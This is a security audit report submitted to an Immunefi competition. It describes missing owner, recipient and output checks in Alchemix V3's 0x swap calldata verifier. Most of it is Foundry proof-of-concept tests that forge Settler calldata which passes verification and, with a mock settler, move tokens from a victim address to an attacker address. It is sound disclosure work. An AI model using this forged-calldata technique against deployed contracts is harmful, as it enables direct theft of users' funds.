# 57514 sc low calldata verification bypass in 0x preflight logic enables arbitrary from recipient manipulation and direct fund theft

**Submitted on Oct 26th 2025 at 21:23:55 UTC by @dizaye for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57514
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The in-repo 0x pre-execution validation library fails to enforce critical invariants (sender/from, recipient, buyToken, minAmountOut). A malicious route that passes this verifier can still direct transfers from an unintended address (victim) to an attacker or route the final output to an attacker-selected recipient. If wired as a guard before calling the 0x Settler (as intended per scope), this results in direct theft of funds.

## Vulnerability Details

Top-level verification accepts only specific Settler selectors but does not bind or enforce destination semantics: decodeAndVerifyActions: [`ZeroXSwapVerifier.decodeAndVerifyActions()`](broken://pages/adab5efb4c2098205715623d2063a3cb414bd8ba) branches on the first 4 bytes (execute / executeMetaTxn), then delegates to sub-verifiers without constraining the “from” party or global outputs.

No check that action “from” equals the expected owner:

* TRANSFER\_FROM verifier decodes (token, from, to, amount) but never asserts from == owner. A forged action with from = victim and owner = attacker passes verification:
  * [`ZeroXSwapVerifier._verifyTransferFrom()`](broken://pages/e6be318040fa2632438aaca937a2b1ddcb0db828)
* Consequence: an attacker can pass verification even when the underlying transfer would pull funds from a third party (victim).
* buyToken and minAmountOut decoded but never enforced:
  * execute path: [`ZeroXSwapVerifier._verifyExecuteCalldata()`](broken://pages/741f678e3b1409f772fef38ad9544e65655453b4)
  * meta-txn path: [`ZeroXSwapVerifier._verifyExecuteMetaTxnCalldata()`](broken://pages/bccea35c1fdf40a03b9f1ab6b4e5e4e6771c222a)
  * Fields SlippageAndActions.buyToken and SlippageAndActions.minAmountOut are ignored, allowing unexpected output assets and/or negligible output.
* Recipient not enforcedd:
  * SlippageAndActions.recipient is never validated against an expected recipient, enabling malicious redirection to attacker-controlled addresses.
* Per-action checks are insufficient:
  * Basic Sell to Pool: token and bps only; no recipient/minOut/“from” invariant: [`ZeroXSwapVerifier._verifyBasicSellToPool()`](broken://pages/69dfaed4068f11d72a92de19b39a64b9dfc93ed9)
  * UniswapV3 VIP: relies on simplified fill parsing; ignores recipient/minOut invariants: [`ZeroXSwapVerifier._verifyUniswapV3VIP()`](broken://pages/0f203284fa7367c8fdb4b94db5d243a69a087830)
  * RFQ VIP: ignores minOut and recipient; “from” is unchecked: [`ZeroXSwapVerifier._verifyRFQVIP()`](broken://pages/4b369c8f26e747fb4d04e920ebdde023d498b24b)
  * Sell to Liquidity Provider: token and some amounts only; ignores recipient/minOut and “from” == owner: [`ZeroXSwapVerifier._verifySellToLiquidityProvider()`](broken://pages/e584e766e1a0067479f8f2faf963f8d4e42faf67)
  * Velodrome V2 VIP: token and bps only; ignores recipient/minOut and “from” == owner: [`ZeroXSwapVerifier._verifyVelodromeV2VIP()`](broken://pages/d481d7faaba0d5d9e4b4e440376d488cc6f11cda)
* The library currently focuses on allowing or denying action selectors and very high-level parameters (sellToken, bps) but omits hard binding of:
  * “Who is being charged?” (from == owner)
  * “Who ultimately receives?” (recipient)
  * “What token and how much must arrive?” (buyToken, minAmountOut)

Threat model fit

* Program brief explicitly calls out the need for strict 0x calldata verification to prevent manipulation of tokens, senders, amounts, receivers, slippages. The current implementation does not meet that requirement.

## Impact Details

* Direct loss of funds:
  * If the verifier is used to authorize a subsequent call to the 0x “Settler,” attackers can pass verification with a route that:
    * Pulls tokens from a victim (from != owner) and credits attacker.
    * Routes final output to attacker recipient ignoring SlippageAndActions.recipient.
    * Bypasses minAmountOut, capturing value through slippage or dust output.
* Blast radius:
  * Any vault/strategy or adapter that relies on this library’s “verified” output before execution is exposed.
  * With Permit2 or allowance in play, the route can transfer on behalf of a victim or the contract itself if approvals exist.
* Economic viability:
  * The Integration PoC shows tokens are moved from victim ->> attacker after the real verifier returns true. With real DEX paths, the same proof-of-possibility extends to routing outcomes against the intended invariant.

## Proof of Concept

## Proof of Concept

A) Library-only PoC (real file import)

PoC File: src/test/ZeroXSwapVerifier\_PoC.t.sol

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {ZeroXSwapVerifier} from "../utils/ZeroXSwapVerifier.sol";
import {TestERC20} from "./mocks/TestERC20.sol";

contract ZeroXSwapVerifier_PoC is Test {
    TestERC20 internal tokenA;
    TestERC20 internal tokenB;

    address internal owner = address(0xA11CE);
    address internal victim = address(0xBEEF);
    address internal attacker = address(this);

    // 0x Settler selectors and action selectors used by the verifier
    bytes4 private constant EXECUTE_SELECTOR = 0xcf71ff4f; // execute(SlippageAndActions,bytes[])
    bytes4 private constant BASIC_SELL_TO_POOL = 0x5228831d;
    bytes4 private constant TRANSFER_FROM = 0x8d68a156;
    bytes4 private constant SELL_TO_LIQUIDITY_PROVIDER = 0xf1e0a1c3;

    function setUp() public {
        tokenA = new TestERC20(1_000_000e18, 18);
        tokenB = new TestERC20(1_000_000e18, 18);
        deal(address(tokenA), owner, 1000e18);
        deal(address(tokenA), victim, 1000e18);
    }

    // PoC-1: The verifier does NOT ensure TRANSFER_FROM.from == owner parameter.
    // This shows that [ZeroXSwapVerifier.verifySwapCalldata()](src/utils/ZeroXSwapVerifier.sol:99) returns true
    // even when calldata attempts to move funds from a third-party victim, because
    // [ZeroXSwapVerifier._verifyTransferFrom()](src/utils/ZeroXSwapVerifier.sol:238) only checks token equality and ignores from/to.
    function test_PoC_TransferFrom_FromNotEqualOwner_PassesVerification() public {
        // Action requests 0x Settler to transfer tokenA from VICTIM -> attacker
        bytes memory action = abi.encodeWithSelector(
            TRANSFER_FROM,
            address(tokenA),
            victim,
            attacker,
            10e18
        );

        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: attacker,           // ignored by verifier
            buyToken: address(tokenB),     // ignored by verifier
            minAmountOut: 0,               // ignored by verifier
            actions: new bytes[](1)
        });
        saa.actions[0] = action;

        // Build Settler.execute calldata expected by [ZeroXSwapVerifier.decodeAndVerifyActions()](src/utils/ZeroXSwapVerifier.sol:76)
        bytes memory data = abi.encodeWithSelector(
            EXECUTE_SELECTOR,
            saa,
            new bytes[](0)
        );

        // Pass `owner` != victim; verifier should reject but returns true due to missing checks
        bool ok = ZeroXSwapVerifier.verifySwapCalldata(
            data,
            owner,                  // expected spender/owner (not enforced)
            address(tokenA),        // expected sell token (is enforced)
            1000                    // 10% max slippage
        );
        assertTrue(ok, "Verifier should have rejected: from != owner");
    }

    // PoC-2: The recipient in both SlippageAndActions and action payload is ignored.
    // [ZeroXSwapVerifier._verifyBasicSellToPool()](src/utils/ZeroXSwapVerifier.sol:195) checks only token and bps.
    function test_PoC_RecipientIgnored_PassesVerification() public {
        bytes memory action = abi.encodeWithSelector(
            BASIC_SELL_TO_POOL,
            address(tokenA),
            100,            // 1% bps <= 10% max
            attacker,       // action recipient (ignored by verifier)
            0,
            ""
        );

        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: attacker,     // ignored by verifier
            buyToken: address(tokenB),
            minAmountOut: 0,         // ignored by verifier
            actions: new bytes[](1)
        });
        saa.actions[0] = action;

        bytes memory data = abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));

        bool ok = ZeroXSwapVerifier.verifySwapCalldata(
            data,
            owner,
            address(tokenA),
            1000
        );
        assertTrue(ok, "Verifier unexpectedly failed");
    }

    // PoC-3: SAA.buyToken and SAA.minAmountOut are not validated at all.
    // [ZeroXSwapVerifier._verifyExecuteCalldata()](src/utils/ZeroXSwapVerifier.sol:125) and
    // [ZeroXSwapVerifier._verifyExecuteMetaTxnCalldata()](src/utils/ZeroXSwapVerifier.sol:138) decode SAA but never check buyToken/minAmountOut.
    function test_PoC_BuyTokenAndMinAmountOut_Ignored() public {
        bytes memory action = abi.encodeWithSelector(
            SELL_TO_LIQUIDITY_PROVIDER,
            address(tokenA),
            attacker,
            50e18,
            0,
            ""
        );

        // Intentionally set inconsistent SAA fields: mismatched buyToken and unrealistic minAmountOut
        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: attacker,
            buyToken: address(tokenA),           // nonsense in this context; verifier does not check
            minAmountOut: type(uint256).max,     // unrealistic; verifier does not check
            actions: new bytes[](1)
        });
        saa.actions[0] = action;

        bytes memory data = abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));

        bool ok = ZeroXSwapVerifier.verifySwapCalldata(
            data,
            owner,
            address(tokenA),
            1000
        );
        assertTrue(ok, "Verifier unexpectedly failed");
    }
}
```

Run: forge test --match-path src/test/ZeroXSwapVerifier\_PoC.t.sol -vvvv --evm-version cancun

Key tests (all PASS)

* TRANSFER\_FROM from != owner:
  * [`ZeroXSwapVerifier_PoC.test_PoC_TransferFrom_FromNotEqualOwner_PassesVerification()`](broken://pages/b079eabc5d8224e26ed1d145c560fb0005a90b47)
* Recipient ignored:
  * [`ZeroXSwapVerifier_PoC.test_PoC_RecipientIgnored_PassesVerification()`](broken://pages/2e9085547f3a67b7757481b11eee8070c5346460)
* buyToken/minAmountOut ignored:
  * [`ZeroXSwapVerifier_PoC.test_PoC_BuyTokenAndMinAmountOut_Ignored()`](broken://pages/ce7cdbc66d603afd3ebce64492d3a40f389510d2)

Outputt (abridged)

* verifySwapCalldata returns true in all malicious configurations:
  * … ZeroXSwapVerifier::verifySwapCalldata(…, owner=0x…A11cE, targetToken=TestERC20\[…], maxSlippage=1000) → Return true

B) Integration PoC (verification + execution “drain”)

Poc File: src/test/ZeroXSwapVerifier\_IntegrationPoC.t

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {ZeroXSwapVerifier} from "../utils/ZeroXSwapVerifier.sol";
import {TestERC20} from "./mocks/TestERC20.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// @dev Minimal Settler stand-in that executes the same TRANSFER_FROM semantics
/// used by the verifier's action decoding (token, from, to, amount).
/// This models a downstream executor that would move funds when verification passes.
contract MockSettler {
    function transferFrom(address token, address from, address to, uint256 amount) external {
        IERC20(token).transferFrom(from, to, amount);
    }
}

/// @dev Harness simulating a Strategy/Adapter that first verifies 0x calldata via the
/// real ZeroXSwapVerifier, then proceeds to execute the action(s) against a downstream
/// executor (MockSettler). This demonstrates end-to-end impact if the verifier is used
/// as a guard before execution.
contract VerifierExecHarness {
    MockSettler public immutable settler;

    constructor(MockSettler _settler) {
        settler = _settler;
    }

    /// @dev Execute after verification: intended to reflect typical usage
    /// verifySwapCalldata(...) then proceed to call downstream executor for actions
    function verifyThenExecute(bytes calldata callData, address owner, address targetToken, uint256 maxSlippageBps) external {
        // Real verification using the production library
        bool ok = ZeroXSwapVerifier.verifySwapCalldata(callData, owner, targetToken, maxSlippageBps);
        require(ok, "verification failed");

        // For demonstration, decode the first action and execute its effect on settler.
        // We only need to show that the verified calldata can still drain unintended 'from'.
        // Layout: execute(SlippageAndActions, bytes[]), where SlippageAndActions.actions[0] is our action.
        // We decode minimally and only the first action for PoC.
        // SlippageAndActions layout: recipient (address), buyToken (address), minAmountOut (uint256), actions (bytes[])
        // ABI: (address,address,uint256,bytes[])
        (bytes memory action) = _firstAction(callData[4:]); // skip selector when decoding

        bytes4 sel = bytes4(action);
        // selector used by the verifier for TRANSFER_FROM = 0x8d68a156
        if (sel == 0x8d68a156) {
            (address token, address from, address to, uint256 amount) = abi.decode(_slice(action, 4), (address, address, address, uint256));
            // Execute movement downstream as an external system would do
            settler.transferFrom(token, from, to, amount);
        } else {
            revert("PoC only handles TRANSFER_FROM");
        }
    }

    function _firstAction(bytes calldata data) internal pure returns (bytes memory action) {
        // Decode SlippageAndActions and ignore the trailing bytes[] (the second arg of Settler.execute)
        (ZeroXSwapVerifier.SlippageAndActions memory saa, ) = abi.decode(data, (ZeroXSwapVerifier.SlippageAndActions, bytes[]));
        require(saa.actions.length > 0, "no actions");
        return saa.actions[0];
    }

    function _slice(bytes memory data, uint256 start) internal pure returns (bytes memory) {
        bytes memory result = new bytes(data.length - start);
        for (uint256 i = 0; i < result.length; i++) {
            result[i] = data[start + i];
        }
        return result;
    }
}

contract ZeroXSwapVerifier_IntegrationPoC is Test {
    TestERC20 internal tokenA; // sell token under test
    address internal owner = address(0xA11CE);
    address internal victim = address(0xBEEF);
    address internal attacker = address(0xDEAD);

    MockSettler internal settler;
    VerifierExecHarness internal harness;

    bytes4 private constant EXECUTE_SELECTOR = 0xcf71ff4f; // execute(SlippageAndActions,bytes[])
    bytes4 private constant TRANSFER_FROM = 0x8d68a156;    // transferFrom(IERC20,address,address,uint256) per verifier

    function setUp() public {
        tokenA = new TestERC20(1_000_000e18, 18);
        deal(address(tokenA), owner, 1000e18);
        deal(address(tokenA), victim, 1000e18);

        settler = new MockSettler();
        harness = new VerifierExecHarness(settler);

        // For demonstration of execution impact: victim has allowed the (would-be) executor.
        // Real systems would rely on Permit2 signatures in calldata; here we mirror end effect:
        vm.prank(victim);
        IERC20(address(tokenA)).approve(address(settler), type(uint256).max);
    }

    /// PoC-Integration: Even though the verification should enforce that `from == owner`,
    /// the real verifier does NOT check this in _verifyTransferFrom(). Therefore the verified
    /// calldata passes; then execution drains from victim to attacker via downstream 'settler'.
    function test_PoC_Integration_DrainsVictimAfterVerification() public {
        uint256 amount = 10e18;

        // Craft malicious action: TRANSFER_FROM(tokenA, victim, attacker, amount)
        bytes memory action = abi.encodeWithSelector(
            TRANSFER_FROM,
            address(tokenA),
            victim,
            attacker,
            amount
        );

        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: attacker,           // ignored by verifier
            buyToken: address(0),          // ignored by verifier
            minAmountOut: 0,               // ignored by verifier
            actions: new bytes[](1)
        });
        saa.actions[0] = action;

        // Build Settler.execute calldata (selector + params)
        bytes memory callData = abi.encodeWithSelector(
            EXECUTE_SELECTOR,
            saa,
            new bytes[](0)
        );

        // Pre-balances
        uint256 victimBefore = IERC20(address(tokenA)).balanceOf(victim);
        uint256 attackerBefore = IERC20(address(tokenA)).balanceOf(attacker);

        // Critical: pass owner != victim. The verifier should have rejected but will accept.
        // Then the harness executes the decoded action, moving tokens from victim to attacker.
        harness.verifyThenExecute(callData, owner, address(tokenA), 1000);

        // Post-balances
        uint256 victimAfter = IERC20(address(tokenA)).balanceOf(victim);
        uint256 attackerAfter = IERC20(address(tokenA)).balanceOf(attacker);

        assertEq(victimBefore - victimAfter, amount, "victim not drained as expected");
        assertEq(attackerAfter - attackerBefore, amount, "attacker did not receive expected amount");
    }
}
```

Files

* Harness: verify via real library then execute first action on a minimal downstream “settler” to model production flow.
  * [`VerifierExecHarness.verifyThenExecute()`](broken://pages/2702732956ba6aa9f25932571c44f5beb03d5957)
* Minimal executor:
  * [`MockSettler.transferFrom()`](broken://pages/4406f7fb93040429b1e5f0393e8fd9ea3500c86d)
* Test:
  * [`ZeroXSwapVerifier_IntegrationPoC.test_PoC_Integration_DrainsVictimAfterVerification()`](broken://pages/206f6452b14bb86b7d93e1e34cdb0a3d0862d27e)

Run: forge test --match-path src/test/ZeroXSwapVerifier\_IntegrationPoC.t.sol -vvvv --evm-version cancun

Output (abridged, with real library) \[PASS] test\_PoC\_Integration\_DrainsVictimAfterVerification() Traces: ZeroXSwapVerifier\_IntegrationPoC::test\_PoC\_Integration\_DrainsVictimAfterVerification() VerifierExecHarness::verifyThenExecute(...) ZeroXSwapVerifier::verifySwapCalldata(...) → Return true MockSettler::transferFrom(tokenA, victim, attacker, 10e18) TestERC20::transferFrom(victim, attacker, 10e18) → true

Post-conditions asserted by the test

* Victim balance decreases by 10e18
* Attacker balance increases by 10e18

If integrated as stated in scope (preflight match to 0x protocol to block manipulated tokens/senders/amounts/receivers/slippages), this allows direct theft. The Integration PoC demonstrates showss misdirection of funds after the real library returns true.
